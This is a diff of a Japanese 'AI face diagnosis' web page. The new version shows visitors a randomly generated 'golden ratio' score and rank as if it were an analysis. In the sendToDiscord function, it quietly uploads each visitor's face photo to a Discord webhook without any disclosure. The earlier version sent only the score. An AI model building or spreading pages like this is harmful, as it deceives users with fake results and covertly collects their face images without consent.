@@ -1,86 +1,137 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <title>顔診断</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #111;
-      color: #fff;
-      text-align: center;
-      padding: 40px;
-    }
-    img {
-      max-width: 300px;
-      margin-top: 20px;
-      border-radius: 12px;
-    }
-    button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-    }
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI 顔診断</title>
+
+<style>
+body {
+  font-family: "Segoe UI", sans-serif;
+  background: linear-gradient(135deg, #111827, #1f2933);
+  color: #fff;
+  text-align: center;
+  padding: 30px;
+}
+
+h1 {
+  font-size: 26px;
+  margin-bottom: 20px;
+}
+
+.card {
+  background: rgba(255,255,255,0.08);
+  border-radius: 16px;
+  padding: 20px;
+  max-width: 420px;
+  margin: auto;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+}
+
+input[type="file"] {
+  font-size: 16px;
+  margin-bottom: 15px;
+}
+
+button {
+  background: #6366f1;
+  border: none;
+  color: #fff;
+  font-size: 18px;
+  padding: 12px 24px;
+  border-radius: 12px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #818cf8;
+}
+
+img {
+  max-width: 100%;
+  border-radius: 12px;
+  margin-top: 15px;
+}
+
+#result {
+  margin-top: 15px;
+  font-size: 16px;
+  line-height: 1.6;
+}
+</style>
 </head>
+
 <body>
 
-  <h1>顔診断</h1>
+<h1>AI 顔診断</h1>
 
+<div class="card">
   <input type="file" id="file" accept="image/*"><br>
   <button onclick="send()">診断する</button>
 
-  <div>
-    <img id="preview" />
-  </div>
-
+  <img id="preview" style="display:none;">
   <div id="result"></div>
+</div>
 
-  <script>
-    const fileInput = document.getElementById("file");
-    const preview = document.getElementById("preview");
-    const result = document.getElementById("result");
+<script>
+const WEBHOOK_URL = "ここにDiscordのWebhookURL";
 
-    fileInput.onchange = () => {
-      const file = fileInput.files[0];
-      if (!file) return;
-      preview.src = URL.createObjectURL(file);
-    };
+function send() {
+  const fileInput = document.getElementById("file");
+  const file = fileInput.files[0];
+  if (!file) {
+    alert("画像を選んでね");
+    return;
+  }
 
-    async function send() {
-      // ダミー診断結果（成功したときと同じ）
-      const score = Math.floor(70 + Math.random() * 20);
-      const rank =
-        score > 90 ? "S" :
-        score > 80 ? "A" :
-        score > 70 ? "B" : "C";
+  const reader = new FileReader();
+  reader.onload = function () {
+    const img = document.getElementById("preview");
+    img.src = reader.result;
+    img.style.display = "block";
 
-      result.innerHTML = `
-        黄金比：${score}%<br>
-        ランク：${rank}
-      `;
+    // 仮の診断ロジック
+    const score = Math.floor(70 + Math.random() * 25);
+    let rank = "B";
+    if (score >= 90) rank = "S";
+    else if (score >= 80) rank = "A";
 
-      await fetch("/.netlify/functions/send", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          score,
-          rank
-        })
-      });
-    }
-  </script>
+    document.getElementById("result").innerHTML = `
+      <b>診断結果</b><br>
+      黄金比スコア：<b>${score}%</b><br>
+      ランク：<b>${rank}</b><br>
+      バランスの良い顔立ちです
+    `;
+
+    sendToDiscord(reader.result, score, rank);
+  };
+
+  reader.readAsDataURL(file);
+}
+
+function sendToDiscord(base64Image, score, rank) {
+  const formData = new FormData();
+  formData.append("file", dataURLtoBlob(base64Image), "face.png");
+  formData.append("payload_json", JSON.stringify({
+    content: `📸 **顔診断結果**\n黄金比：${score}%\nランク：${rank}`
+  }));
+
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    body: formData
+  });
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+</script>
 
 </body>
-</html>
-
 </html>
